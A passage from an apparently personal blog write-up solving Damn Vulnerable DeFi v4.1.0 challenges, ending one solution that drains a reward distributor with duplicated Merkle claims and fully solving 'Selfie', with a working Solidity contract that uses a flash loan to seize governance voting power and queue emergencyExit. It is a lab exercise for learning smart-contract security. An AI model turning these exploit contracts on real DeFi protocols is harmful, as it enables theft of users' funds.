    uint256 wethN = wethRemaining / wethAmount;

    // Step 6: create array for duplicated claim
    Claim[] memory claims = new Claim[](dvtN + wethN);
    for (uint256 i = 0; i < dvtN; i++) {
        claims[i] = Claim({
            batchNumber: 0,
            amount: dvtAmount,
            tokenIndex: 0,
            proof: dvtProof
        });
    }
    for (uint256 i = 0; i < wethN; i++) {
        claims[dvtN + i] = Claim({
            batchNumber: 0,
            amount: wethAmount,
            tokenIndex: 1,
            proof: wethProof
        });
    }

    // Step 7: trigger the vulnerability
    distributor.claimRewards(claims, tokensToClaim);

    // Step 8: transfer every tokens to recovery
    dvt.transfer(recovery, dvt.balanceOf(player));
    weth.transfer(recovery, weth.balanceOf(player));
}
```

## 6. Selfie: believe or not, I am your governor!  

### Challenge Explanation  

We’re back again with a flash loan challenge!  

The `SelfiePool.flashLoan()` function works as follows:  

→ Lends `_amount`  
→ Calls the `onFlashLoan()` function defined in the `_receiver` contract  
→ Expects the loaned `_amount` to be repaid in full  

At first glance, it looks fairly straightforward. However, what really stands out here is the presence of a contract called `SimpleGovernance`.  


```solidity
contract SelfiePool is IERC3156FlashLender, ReentrancyGuard {
	  // ....
    
    modifier onlyGovernance() {
        if (msg.sender != address(governance)) {
            revert CallerNotGovernance();
        }
        _;
    }

    constructor(IERC20 _token, SimpleGovernance _governance) {
        token = _token;
        governance = _governance;
    }
    
	  // ....
    
    function flashLoan(IERC3156FlashBorrower _receiver, address _token, uint256 _amount, bytes calldata _data)
        external
        nonReentrant
        returns (bool)
    {
        if (_token != address(token)) {
            revert UnsupportedCurrency();
        }

        token.transfer(address(_receiver), _amount);
        if (_receiver.onFlashLoan(msg.sender, _token, _amount, 0, _data) != CALLBACK_SUCCESS) {
            revert CallbackFailed();
        }

        if (!token.transferFrom(address(_receiver), address(this), _amount)) {
            revert RepayFailed();
        }

        return true;
    }

    function emergencyExit(address receiver) external onlyGovernance {
        uint256 amount = token.balanceOf(address(this));
        token.transfer(receiver, amount);

        emit EmergencyExit(receiver, amount);
    }
}
```

[Governance](https://medium.com/@dkopolovets/smart-contract-governance-56852c90d3c2) refers to a decision-making body composed of users of a smart contract, typically called a **DAO** (**D**ecentralized **A**utonomous **O**rganization).  

DAOs that utilize a given smart contract generally hold voting rights and conduct votes. The DAO members with the majority of voting power gain access to certain administrator-level functions or variables within the smart contract.  

![](/2025/09/07/d4tura/smartcontracts/en/image7.png)  

In most cases, these voting rights are determined by the number of governance tokens issued by the smart contract that a member holds.  

In the case of this challenge’s `SimpleGovernance` contract, the function `_hasEnoughVotes()` ensures that only those who hold more than half of the total voting tokens (`_votingToken`) can call [SimpleGovernance.queueAction()](https://github.com/theredguild/damn-vulnerable-defi/blob/v4.1.0/src/selfie/SimpleGovernance.sol#L23).  

```solidity
contract SimpleGovernance is ISimpleGovernance {
		// ....
		
    constructor(DamnValuableVotes votingToken) {
        _votingToken = votingToken;
        _actionCounter = 1;
    }
    
    function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId) {
        if (!_hasEnoughVotes(msg.sender)) {
            revert NotEnoughVotes(msg.sender);
        }
    
    // ....
   
     function _hasEnoughVotes(address who) private view returns (bool) {
        uint256 balance = _votingToken.getVotes(who);
        uint256 halfTotalSupply = _votingToken.totalSupply() / 2;
        return balance > halfTotalSupply;
    }
}
```

The important point here is that in the [SelfieChallenge.setUp()](https://github.com/theredguild/damn-vulnerable-defi/blob/v4.1.0/test/selfie/Selfie.t.sol#L32) function, the token used as the loanable asset for the `SelfiePool` is the **same** token, `DamnValuableVotes`, that is also used as the governance voting token.  

```solidity
function setUp() public {
    // ....

    // Deploy token
    token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);

    // Deploy governance contract
    governance = new SimpleGovernance(token);

    // Deploy pool
    pool = new SelfiePool(token, governance);

    // ....
```

### Challenge Solving  

Since the token used for loans and the token used for voting are the same, borrowing a large amount of tokens via `SelfiePool.flashLoan()` temporarily grants us **the same amount of voting power**. While holding these borrowed tokens, we gain the ability to call `SimpleGovernance.queueAction()`.  

The `queueAction()` function allows us to schedule a specific function call (an Action) into the governance queue. We can leverage this by scheduling a call to the `emergencyExit()` function, which withdraws all funds from the `SelfiePool`.  

```solidity
// SimpleGovernance.queueAction
function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId) {
    if (!_hasEnoughVotes(msg.sender)) {
        revert NotEnoughVotes(msg.sender);
    }

    // ....

    actionId = _actionCounter;

    _actions[actionId] = GovernanceAction({
        target: target,
        value: value,
        proposedAt: uint64(block.timestamp),
        executedAt: 0,
        data: data
    });

    unchecked {
        _actionCounter++;
    }

    // ....
}

// SimpleGovernance.executeAction
function executeAction(uint256 actionId) external payable returns (bytes memory) {
	  // _canBeExecuted: requires 2 days delay after queueAction execute
    if (!_canBeExecuted(actionId)) {
        revert CannotExecute(actionId);
    }

    GovernanceAction storage actionToExecute = _actions[actionId];
    actionToExecute.executedAt = uint64(block.timestamp);

    emit ActionExecuted(actionId, msg.sender);

    return actionToExecute.target.functionCallWithValue(actionToExecute.data, actionToExecute.value);
}

// SelfiePool.emergencyExit
function emergencyExit(address receiver) external onlyGovernance {
    uint256 amount = token.balanceOf(address(this));
    token.transfer(receiver, amount);

    emit EmergencyExit(receiver, amount);
}
```

The `SimpleGovernance.executeAction()` function is responsible for executing an action that has been queued. For security, it enforces a time delay by checking the [SimpleGovernance._canBeExecuted()](https://github.com/theredguild/damn-vulnerable-defi/blob/8eb38eff704e87c90fe5297b16cdeaec21eed01f/src/selfie/SimpleGovernance.sol#L87) function. This requires that **at least 2 days** ( = [ACTION_DELAY_IN_SECONDS](https://github.com/theredguild/damn-vulnerable-defi/blob/8eb38eff704e87c90fe5297b16cdeaec21eed01f/src/selfie/SimpleGovernance.sol#L12)) have passed since the `queueAction()` call before the action can be executed.  

In the testing environment, of course, we can bypass this by using the [vm.warp()](https://getfoundry.sh/reference/cheatcodes/warp.html) function to modify the `block.timestamp` value.  

Based on the analysis so far, the attack flow can be summarized as follows:  

1. Call `SelfiePool.flashLoan()` to borrow tokens without collateral and gain massive voting power.  
2. From within the `onFlashLoan()` callback, call `SimpleGovernance.queueAction()` to insert a call to `SelfiePool.emergencyExit()` into the `_actions` array.  
3. Use `vm.warp()` to advance the `block.timestamp` by at least 2 days.  
4. Call `SimpleGovernance.executeAction()` to execute the queued action.  

```solidity
    function test_selfie() public checkSolvedByPlayer {
        SelfieSolver solver = new SelfieSolver(pool, governance, token, recovery);
        solver.solve();
        vm.warp(block.timestamp + 2 days);
        solver.execute();
    }
  
// ....

contract SelfieSolver is IERC3156FlashBorrower {
    SelfiePool public immutable pool;
    SimpleGovernance public immutable governance;
    DamnValuableVotes public immutable token;
    address public immutable recovery;
    uint256 actionId;

    constructor(
        SelfiePool _pool,
        SimpleGovernance _governance,
        DamnValuableVotes _token,
        address _recovery
    ) {
        pool = _pool;
        governance = _governance;
        token = _token;
        recovery = _recovery;
    }

    function solve() external {
        uint256 amount = token.balanceOf(address(pool));
        pool.flashLoan(this, address(token), amount, "");
    }

    function onFlashLoan(
        address initiator,
        address tokenAddr,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external override returns (bytes32) {
        // delegate voting 
        token.delegate(address(this));

        bytes memory callData = abi.encodeCall(pool.emergencyExit, (recovery));
        actionId = governance.queueAction(address(pool), 0, callData);

        token.approve(address(pool), amount);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function execute() external {
        governance.executeAction(actionId);
    }
}
```

## Next To Do  

That’s it for PART 1!

Challenges 6–12 will be covered in PART 2, and Challenges 13–18 will be addressed in PART 3. Writing this document wasn’t easy, as I’m still learning myself and had to rely on my limited knowledge. But in PART 2, I’ll do my best to dive deeper into each topic and provide more thorough explanations.  

Thank you!


## Reference

- https://www.damnvulnerabledefi.xyz/
- https://github.com/theredguild/damn-vulnerable-defi/tree/v4.1.0
- https://blog.theredguild.org/releasing-damn-vulnerable-defi-v4/
- https://docs.openzeppelin.com/
- https://eips.ethereum.org/erc